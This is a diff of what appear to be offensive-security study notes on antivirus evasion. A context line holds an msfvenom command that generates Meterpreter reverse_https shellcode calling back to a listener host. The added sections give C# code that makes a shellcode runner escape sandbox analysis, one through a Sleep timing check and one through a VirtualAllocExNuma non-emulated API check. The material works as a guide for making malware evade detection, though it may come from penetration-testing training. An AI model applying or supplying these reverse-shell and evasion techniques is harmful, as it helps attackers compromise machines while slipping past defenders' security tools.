@@ -275,8 +275,6 @@ namespace Helper
 }
 ```
 
-
-
 Generate shellcode:
 ```
 sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=3141 -f csharp
@@ -332,5 +330,61 @@ namespace ConsoleApp1
 </details>
 
 # Sleep Timers
+One of the oldest behavior analysis bypass techniques revolves around time delays. If an application is running in a simulator and the heuristics engine encounters a pause or sleep instruction, it will "fast forward" through the delay to the point that the application resumes its actions. This avoids a potentially long wait time during a heuristics scan.
+
+Use the following snipped in the encrypted C# shellcode runner from the previous section
+
+<details>
+  <summary>Expand</summary>
+```csharp
+...
+[DllImport("kernel32.dll")]
+static extern void Sleep(uint dwMilliseconds);
+        
+static void Main(string[] args)
+{
+    DateTime t1 = DateTime.Now;
+    Sleep(2000);
+    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+    if(t2 < 1.5)
+    {
+        return;
+    }
+...
+```
+</details>
 
 # Non-emulated APIs
+Antivirus emulator engines only simulate the execution of most common executable file formats and functions. Knowing this, we can attempt to bypass detection with a function (typically a Win32 API) that is either incorrectly emulated or is not emulated at all.
+
+There is no "master list" for obscure APIs, but browsing APIs on MSDN and reading about their intended purposes may provide clues as to how common they may be.
+We will use VirtualAllocExNuma as an example. Sadly, pinvoke.net does not contain an entry for VirtualAllocExNuma, but we can compare the C type function prototype of VirtualAllocEx3 and VirtualAllocExNuma4.
+
+<details>
+  <summary>Expand</summary>
+
+The function prototypes of VirtualAllocEx and VirtualAllocExNuma are almost the same, there is only the additional parameter 'nndPreferred' (DWORD). so we add the following import statement to our code:
+
+```csharp
+[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
+    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+[DllImport("kernel32.dll")]
+static extern IntPtr GetCurrentProcess();
+```
+
+Last we add the following if statement (simimlar to sleep statement in previous section) so the code just gracefully exits in case the API is not emulated in the simulated environment (sandbox)
+
+```csharp
+IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+if(mem == null)
+{
+    return;
+}
+
+```
+
+
+
+</details>
